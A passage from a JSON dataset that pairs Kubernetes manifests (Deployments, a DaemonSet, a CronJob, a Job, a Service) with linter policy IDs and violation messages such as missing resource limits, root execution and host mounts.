    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: kuard\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kuard\n  template:\n    metadata:\n      labels:\n        app: kuard\n        version: '2'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9399",
    "manifest_path": "data/manifests/the_stack_sample/sample_3568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: kuard\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kuard\n  template:\n    metadata:\n      labels:\n        app: kuard\n        version: '2'\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9400",
    "manifest_path": "data/manifests/the_stack_sample/sample_3569.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tripviewer-deployment\n  namespace: web\n  labels:\n    app: tripviewer-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tripviewer\n  template:\n    metadata:\n      labels:\n        app: tripviewer\n    spec:\n      containers:\n      - name: tripviewer\n        image: registrylzk2091.azurecr.io/tripviewer:1.0\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: USERPROFILE_API_ENDPOINT\n          value: http://userprofile-subdomain.api.svc.cluster.local\n        - name: TRIPS_API_ENDPOINT\n          value: http://trips-subdomain.api.svc.cluster.local\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tripviewer\" does not have a read-only root file system"
  },
  {
    "id": "9401",
    "manifest_path": "data/manifests/the_stack_sample/sample_3569.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tripviewer-deployment\n  namespace: web\n  labels:\n    app: tripviewer-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tripviewer\n  template:\n    metadata:\n      labels:\n        app: tripviewer\n    spec:\n      containers:\n      - name: tripviewer\n        image: registrylzk2091.azurecr.io/tripviewer:1.0\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: USERPROFILE_API_ENDPOINT\n          value: http://userprofile-subdomain.api.svc.cluster.local\n        - name: TRIPS_API_ENDPOINT\n          value: http://trips-subdomain.api.svc.cluster.local\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tripviewer\" is not set to runAsNonRoot"
  },
  {
    "id": "9402",
    "manifest_path": "data/manifests/the_stack_sample/sample_3569.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tripviewer-deployment\n  namespace: web\n  labels:\n    app: tripviewer-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tripviewer\n  template:\n    metadata:\n      labels:\n        app: tripviewer\n    spec:\n      containers:\n      - name: tripviewer\n        image: registrylzk2091.azurecr.io/tripviewer:1.0\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: USERPROFILE_API_ENDPOINT\n          value: http://userprofile-subdomain.api.svc.cluster.local\n        - name: TRIPS_API_ENDPOINT\n          value: http://trips-subdomain.api.svc.cluster.local\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tripviewer\" has cpu request 0"
  },
  {
    "id": "9403",
    "manifest_path": "data/manifests/the_stack_sample/sample_3569.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tripviewer-deployment\n  namespace: web\n  labels:\n    app: tripviewer-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tripviewer\n  template:\n    metadata:\n      labels:\n        app: tripviewer\n    spec:\n      containers:\n      - name: tripviewer\n        image: registrylzk2091.azurecr.io/tripviewer:1.0\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: USERPROFILE_API_ENDPOINT\n          value: http://userprofile-subdomain.api.svc.cluster.local\n        - name: TRIPS_API_ENDPOINT\n          value: http://trips-subdomain.api.svc.cluster.local\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tripviewer\" has memory limit 0"
  },
  {
    "id": "9404",
    "manifest_path": "data/manifests/the_stack_sample/sample_3571.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: wavefront-collector\n  namespace: wavefront-collector\n  labels:\n    k8s-app: wavefront-collector\n    name: wavefront-collector\nspec:\n  selector:\n    matchLabels:\n      k8s-app: wavefront-collector\n  template:\n    metadata:\n      labels:\n        k8s-app: wavefront-collector\n    spec:\n      serviceAccountName: wavefront-collector\n      containers:\n      - name: wavefront-collector\n        image: wavefronthq/wavefront-kubernetes-collector:1.3.2\n        imagePullPolicy: IfNotPresent\n        command:\n        - /wavefront-collector\n        - --daemon=true\n        - --config-file=/etc/collector/collector.yaml\n        volumeMounts:\n        - name: procfs\n          mountPath: /host/proc\n          readOnly: true\n        - mountPath: /etc/collector/\n          name: collector-config\n          readOnly: true\n        env:\n        - name: HOST_PROC\n          value: /host/proc\n        - name: POD_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n      volumes:\n      - name: procfs\n        hostPath:\n          path: /proc\n      - name: collector-config\n        configMap:\n          name: collector-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wavefront-collector\" does not have a read-only root file system"
  },
  {
    "id": "9405",
    "manifest_path": "data/manifests/the_stack_sample/sample_3571.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: wavefront-collector\n  namespace: wavefront-collector\n  labels:\n    k8s-app: wavefront-collector\n    name: wavefront-collector\nspec:\n  selector:\n    matchLabels:\n      k8s-app: wavefront-collector\n  template:\n    metadata:\n      labels:\n        k8s-app: wavefront-collector\n    spec:\n      serviceAccountName: wavefront-collector\n      containers:\n      - name: wavefront-collector\n        image: wavefronthq/wavefront-kubernetes-collector:1.3.2\n        imagePullPolicy: IfNotPresent\n        command:\n        - /wavefront-collector\n        - --daemon=true\n        - --config-file=/etc/collector/collector.yaml\n        volumeMounts:\n        - name: procfs\n          mountPath: /host/proc\n          readOnly: true\n        - mountPath: /etc/collector/\n          name: collector-config\n          readOnly: true\n        env:\n        - name: HOST_PROC\n          value: /host/proc\n        - name: POD_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n      volumes:\n      - name: procfs\n        hostPath:\n          path: /proc\n      - name: collector-config\n        configMap:\n          name: collector-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"wavefront-collector\" not found"
  },
  {
    "id": "9406",
    "manifest_path": "data/manifests/the_stack_sample/sample_3571.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: wavefront-collector\n  namespace: wavefront-collector\n  labels:\n    k8s-app: wavefront-collector\n    name: wavefront-collector\nspec:\n  selector:\n    matchLabels:\n      k8s-app: wavefront-collector\n  template:\n    metadata:\n      labels:\n        k8s-app: wavefront-collector\n    spec:\n      serviceAccountName: wavefront-collector\n      containers:\n      - name: wavefront-collector\n        image: wavefronthq/wavefront-kubernetes-collector:1.3.2\n        imagePullPolicy: IfNotPresent\n        command:\n        - /wavefront-collector\n        - --daemon=true\n        - --config-file=/etc/collector/collector.yaml\n        volumeMounts:\n        - name: procfs\n          mountPath: /host/proc\n          readOnly: true\n        - mountPath: /etc/collector/\n          name: collector-config\n          readOnly: true\n        env:\n        - name: HOST_PROC\n          value: /host/proc\n        - name: POD_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n      volumes:\n      - name: procfs\n        hostPath:\n          path: /proc\n      - name: collector-config\n        configMap:\n          name: collector-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wavefront-collector\" is not set to runAsNonRoot"
  },
  {
    "id": "9407",
    "manifest_path": "data/manifests/the_stack_sample/sample_3571.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: wavefront-collector\n  namespace: wavefront-collector\n  labels:\n    k8s-app: wavefront-collector\n    name: wavefront-collector\nspec:\n  selector:\n    matchLabels:\n      k8s-app: wavefront-collector\n  template:\n    metadata:\n      labels:\n        k8s-app: wavefront-collector\n    spec:\n      serviceAccountName: wavefront-collector\n      containers:\n      - name: wavefront-collector\n        image: wavefronthq/wavefront-kubernetes-collector:1.3.2\n        imagePullPolicy: IfNotPresent\n        command:\n        - /wavefront-collector\n        - --daemon=true\n        - --config-file=/etc/collector/collector.yaml\n        volumeMounts:\n        - name: procfs\n          mountPath: /host/proc\n          readOnly: true\n        - mountPath: /etc/collector/\n          name: collector-config\n          readOnly: true\n        env:\n        - name: HOST_PROC\n          value: /host/proc\n        - name: POD_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n      volumes:\n      - name: procfs\n        hostPath:\n          path: /proc\n      - name: collector-config\n        configMap:\n          name: collector-config\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/proc\" is mounted on container \"wavefront-collector\""
  },
  {
    "id": "9408",
    "manifest_path": "data/manifests/the_stack_sample/sample_3571.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: wavefront-collector\n  namespace: wavefront-collector\n  labels:\n    k8s-app: wavefront-collector\n    name: wavefront-collector\nspec:\n  selector:\n    matchLabels:\n      k8s-app: wavefront-collector\n  template:\n    metadata:\n      labels:\n        k8s-app: wavefront-collector\n    spec:\n      serviceAccountName: wavefront-collector\n      containers:\n      - name: wavefront-collector\n        image: wavefronthq/wavefront-kubernetes-collector:1.3.2\n        imagePullPolicy: IfNotPresent\n        command:\n        - /wavefront-collector\n        - --daemon=true\n        - --config-file=/etc/collector/collector.yaml\n        volumeMounts:\n        - name: procfs\n          mountPath: /host/proc\n          readOnly: true\n        - mountPath: /etc/collector/\n          name: collector-config\n          readOnly: true\n        env:\n        - name: HOST_PROC\n          value: /host/proc\n        - name: POD_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n      volumes:\n      - name: procfs\n        hostPath:\n          path: /proc\n      - name: collector-config\n        configMap:\n          name: collector-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wavefront-collector\" has cpu request 0"
  },
  {
    "id": "9409",
    "manifest_path": "data/manifests/the_stack_sample/sample_3571.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: wavefront-collector\n  namespace: wavefront-collector\n  labels:\n    k8s-app: wavefront-collector\n    name: wavefront-collector\nspec:\n  selector:\n    matchLabels:\n      k8s-app: wavefront-collector\n  template:\n    metadata:\n      labels:\n        k8s-app: wavefront-collector\n    spec:\n      serviceAccountName: wavefront-collector\n      containers:\n      - name: wavefront-collector\n        image: wavefronthq/wavefront-kubernetes-collector:1.3.2\n        imagePullPolicy: IfNotPresent\n        command:\n        - /wavefront-collector\n        - --daemon=true\n        - --config-file=/etc/collector/collector.yaml\n        volumeMounts:\n        - name: procfs\n          mountPath: /host/proc\n          readOnly: true\n        - mountPath: /etc/collector/\n          name: collector-config\n          readOnly: true\n        env:\n        - name: HOST_PROC\n          value: /host/proc\n        - name: POD_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n      volumes:\n      - name: procfs\n        hostPath:\n          path: /proc\n      - name: collector-config\n        configMap:\n          name: collector-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wavefront-collector\" has memory limit 0"
  },
  {
    "id": "9410",
    "manifest_path": "data/manifests/the_stack_sample/sample_3572.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: monthly-backup-educationhistory-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: backup\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: monthly-backup-educationhistory-lib-unb-ca\n          args:\n          - monthly\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          - name: MYSQL_DATABASE\n            value: eduhist_db\n          - name: MYSQL_USER_NAME\n            value: root\n          - name: MYSQL_USER_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: mysql\n                key: root-password\n          - name: RSNAPSHOT_RETAIN_HOURLY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_DAILY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_WEEKLY\n            value: '0'\n          image: ghcr.io/unb-libraries/mysql-backup:latest\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /data\n            name: backup-persistent-storage\n        volumes:\n        - name: backup-persistent-storage\n          persistentVolumeClaim:\n            claimName: backup-educationhistory-lib-unb-ca\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"monthly-backup-educationhistory-lib-unb-ca\" is using an invalid container image, \"ghcr.io/unb-libraries/mysql-backup:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9411",
    "manifest_path": "data/manifests/the_stack_sample/sample_3572.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: monthly-backup-educationhistory-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: backup\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: monthly-backup-educationhistory-lib-unb-ca\n          args:\n          - monthly\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          - name: MYSQL_DATABASE\n            value: eduhist_db\n          - name: MYSQL_USER_NAME\n            value: root\n          - name: MYSQL_USER_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: mysql\n                key: root-password\n          - name: RSNAPSHOT_RETAIN_HOURLY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_DAILY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_WEEKLY\n            value: '0'\n          image: ghcr.io/unb-libraries/mysql-backup:latest\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /data\n            name: backup-persistent-storage\n        volumes:\n        - name: backup-persistent-storage\n          persistentVolumeClaim:\n            claimName: backup-educationhistory-lib-unb-ca\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monthly-backup-educationhistory-lib-unb-ca\" does not have a read-only root file system"
  },
  {
    "id": "9412",
    "manifest_path": "data/manifests/the_stack_sample/sample_3572.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: monthly-backup-educationhistory-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: backup\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: monthly-backup-educationhistory-lib-unb-ca\n          args:\n          - monthly\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          - name: MYSQL_DATABASE\n            value: eduhist_db\n          - name: MYSQL_USER_NAME\n            value: root\n          - name: MYSQL_USER_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: mysql\n                key: root-password\n          - name: RSNAPSHOT_RETAIN_HOURLY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_DAILY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_WEEKLY\n            value: '0'\n          image: ghcr.io/unb-libraries/mysql-backup:latest\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /data\n            name: backup-persistent-storage\n        volumes:\n        - name: backup-persistent-storage\n          persistentVolumeClaim:\n            claimName: backup-educationhistory-lib-unb-ca\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monthly-backup-educationhistory-lib-unb-ca\" is not set to runAsNonRoot"
  },
  {
    "id": "9413",
    "manifest_path": "data/manifests/the_stack_sample/sample_3572.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: monthly-backup-educationhistory-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: backup\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: monthly-backup-educationhistory-lib-unb-ca\n          args:\n          - monthly\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          - name: MYSQL_DATABASE\n            value: eduhist_db\n          - name: MYSQL_USER_NAME\n            value: root\n          - name: MYSQL_USER_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: mysql\n                key: root-password\n          - name: RSNAPSHOT_RETAIN_HOURLY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_DAILY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_WEEKLY\n            value: '0'\n          image: ghcr.io/unb-libraries/mysql-backup:latest\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /data\n            name: backup-persistent-storage\n        volumes:\n        - name: backup-persistent-storage\n          persistentVolumeClaim:\n            claimName: backup-educationhistory-lib-unb-ca\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monthly-backup-educationhistory-lib-unb-ca\" has cpu request 0"
  },
  {
    "id": "9414",
    "manifest_path": "data/manifests/the_stack_sample/sample_3572.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: monthly-backup-educationhistory-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: backup\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: monthly-backup-educationhistory-lib-unb-ca\n          args:\n          - monthly\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          - name: MYSQL_DATABASE\n            value: eduhist_db\n          - name: MYSQL_USER_NAME\n            value: root\n          - name: MYSQL_USER_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: mysql\n                key: root-password\n          - name: RSNAPSHOT_RETAIN_HOURLY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_DAILY\n            value: '0'\n          - name: RSNAPSHOT_RETAIN_WEEKLY\n            value: '0'\n          image: ghcr.io/unb-libraries/mysql-backup:latest\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /data\n            name: backup-persistent-storage\n        volumes:\n        - name: backup-persistent-storage\n          persistentVolumeClaim:\n            claimName: backup-educationhistory-lib-unb-ca\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monthly-backup-educationhistory-lib-unb-ca\" has memory limit 0"
  },
  {
    "id": "9415",
    "manifest_path": "data/manifests/the_stack_sample/sample_3574.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tlp-stress\nspec:\n  template:\n    spec:\n      containers:\n      - name: tlp-stress\n        image: thelastpickle/tlp-stress\n        imagePullPolicy: IfNotPresent\n        args:\n        - run\n        - KeyValue\n        - --host\n        - cassandra\n        - --duration\n        - 2m\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "9416",
    "manifest_path": "data/manifests/the_stack_sample/sample_3574.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tlp-stress\nspec:\n  template:\n    spec:\n      containers:\n      - name: tlp-stress\n        image: thelastpickle/tlp-stress\n        imagePullPolicy: IfNotPresent\n        args:\n        - run\n        - KeyValue\n        - --host\n        - cassandra\n        - --duration\n        - 2m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tlp-stress\" is using an invalid container image, \"thelastpickle/tlp-stress\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9417",
    "manifest_path": "data/manifests/the_stack_sample/sample_3574.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tlp-stress\nspec:\n  template:\n    spec:\n      containers:\n      - name: tlp-stress\n        image: thelastpickle/tlp-stress\n        imagePullPolicy: IfNotPresent\n        args:\n        - run\n        - KeyValue\n        - --host\n        - cassandra\n        - --duration\n        - 2m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tlp-stress\" does not have a read-only root file system"
  },
  {
    "id": "9418",
    "manifest_path": "data/manifests/the_stack_sample/sample_3574.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tlp-stress\nspec:\n  template:\n    spec:\n      containers:\n      - name: tlp-stress\n        image: thelastpickle/tlp-stress\n        imagePullPolicy: IfNotPresent\n        args:\n        - run\n        - KeyValue\n        - --host\n        - cassandra\n        - --duration\n        - 2m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tlp-stress\" is not set to runAsNonRoot"
  },
  {
    "id": "9419",
    "manifest_path": "data/manifests/the_stack_sample/sample_3574.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tlp-stress\nspec:\n  template:\n    spec:\n      containers:\n      - name: tlp-stress\n        image: thelastpickle/tlp-stress\n        imagePullPolicy: IfNotPresent\n        args:\n        - run\n        - KeyValue\n        - --host\n        - cassandra\n        - --duration\n        - 2m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tlp-stress\" has cpu request 0"
  },
  {
    "id": "9420",
    "manifest_path": "data/manifests/the_stack_sample/sample_3574.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tlp-stress\nspec:\n  template:\n    spec:\n      containers:\n      - name: tlp-stress\n        image: thelastpickle/tlp-stress\n        imagePullPolicy: IfNotPresent\n        args:\n        - run\n        - KeyValue\n        - --host\n        - cassandra\n        - --duration\n        - 2m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tlp-stress\" has memory limit 0"
  },
  {
    "id": "9421",
    "manifest_path": "data/manifests/the_stack_sample/sample_3576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nblotti-pheidippides\n  labels:\n    app: nblotti_pheidippides\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nblotti_pheidippides\n  template:\n    metadata:\n      labels:\n        app: nblotti_pheidippides\n    spec:\n      containers:\n      - name: nblotti\n        image: nblotti/pheidippides:v2.0.1\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n          initialDelaySeconds: 10\n          failureThreshold: 1\n          periodSeconds: 30\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nblotti\" does not have a read-only root file system"
  },
  {
    "id": "9422",
    "manifest_path": "data/manifests/the_stack_sample/sample_3576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nblotti-pheidippides\n  labels:\n    app: nblotti_pheidippides\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nblotti_pheidippides\n  template:\n    metadata:\n      labels:\n        app: nblotti_pheidippides\n    spec:\n      containers:\n      - name: nblotti\n        image: nblotti/pheidippides:v2.0.1\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n          initialDelaySeconds: 10\n          failureThreshold: 1\n          periodSeconds: 30\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nblotti\" is not set to runAsNonRoot"
  },
  {
    "id": "9423",
    "manifest_path": "data/manifests/the_stack_sample/sample_3576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nblotti-pheidippides\n  labels:\n    app: nblotti_pheidippides\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nblotti_pheidippides\n  template:\n    metadata:\n      labels:\n        app: nblotti_pheidippides\n    spec:\n      containers:\n      - name: nblotti\n        image: nblotti/pheidippides:v2.0.1\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n          initialDelaySeconds: 10\n          failureThreshold: 1\n          periodSeconds: 30\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nblotti\" has cpu request 0"
  },
  {
    "id": "9424",
    "manifest_path": "data/manifests/the_stack_sample/sample_3576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nblotti-pheidippides\n  labels:\n    app: nblotti_pheidippides\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nblotti_pheidippides\n  template:\n    metadata:\n      labels:\n        app: nblotti_pheidippides\n    spec:\n      containers:\n      - name: nblotti\n        image: nblotti/pheidippides:v2.0.1\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n          initialDelaySeconds: 10\n          failureThreshold: 1\n          periodSeconds: 30\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nblotti\" has memory limit 0"
  },
  {
    "id": "9425",
    "manifest_path": "data/manifests/the_stack_sample/sample_3579.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: frontend\n  labels:\n    app.kubernetes.io/name: guestbook\n    app.kubernetes.io/component: frontend\nspec:\n  ports:\n  - port: 80\n  selector:\n    app.kubernetes.io/name: guestbook\n    app.kubernetes.io/component: frontend\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:frontend app.kubernetes.io/name:guestbook])"
  },
  {
    "id": "9426",
    "manifest_path": "data/manifests/the_stack_sample/sample_3580.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ingress-router\n  namespace: openshift-ingress\n  labels:\n    k8s-app: ingress-router\nspec:\n  selector:\n    matchLabels:\n      k8s-app: ingress-router\n  template:\n    metadata:\n      labels:\n        k8s-app: ingress-router\n    spec:\n      serviceAccountName: ingress-router\n      containers:\n      - env:\n        - name: ROUTER_LISTEN_ADDR\n          value: 0.0.0.0:1936\n        - name: ROUTER_METRICS_TYPE\n          value: haproxy\n        - name: ROUTER_SERVICE_HTTPS_PORT\n          value: '443'\n        - name: ROUTER_SERVICE_HTTP_PORT\n          value: '80'\n        - name: ROUTER_THREADS\n          value: '4'\n        image: openshift/origin-haproxy-router:v4.0.0\n        livenessProbe:\n          httpGet:\n            host: localhost\n            path: /healthz\n            port: 1936\n          initialDelaySeconds: 10\n        name: router\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        - containerPort: 1936\n          name: stats\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            host: localhost\n            path: healthz/ready\n            port: 1936\n          initialDelaySeconds: 10\n        resources:\n          requests:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "9427",
    "manifest_path": "data/manifests/the_stack_sample/sample_3580.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ingress-router\n  namespace: openshift-ingress\n  labels:\n    k8s-app: ingress-router\nspec:\n  selector:\n    matchLabels:\n      k8s-app: ingress-router\n  template:\n    metadata:\n      labels:\n        k8s-app: ingress-router\n    spec:\n      serviceAccountName: ingress-router\n      containers:\n      - env:\n        - name: ROUTER_LISTEN_ADDR\n          value: 0.0.0.0:1936\n        - name: ROUTER_METRICS_TYPE\n          value: haproxy\n        - name: ROUTER_SERVICE_HTTPS_PORT\n          value: '443'\n        - name: ROUTER_SERVICE_HTTP_PORT\n          value: '80'\n        - name: ROUTER_THREADS\n          value: '4'\n        image: openshift/origin-haproxy-router:v4.0.0\n        livenessProbe:\n          httpGet:\n            host: localhost\n            path: /healthz\n            port: 1936\n          initialDelaySeconds: 10\n        name: router\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        - containerPort: 1936\n          name: stats\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            host: localhost\n            path: healthz/ready\n            port: 1936\n          initialDelaySeconds: 10\n        resources:\n          requests:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"router\" does not have a read-only root file system"
  },
  {
    "id": "9428",
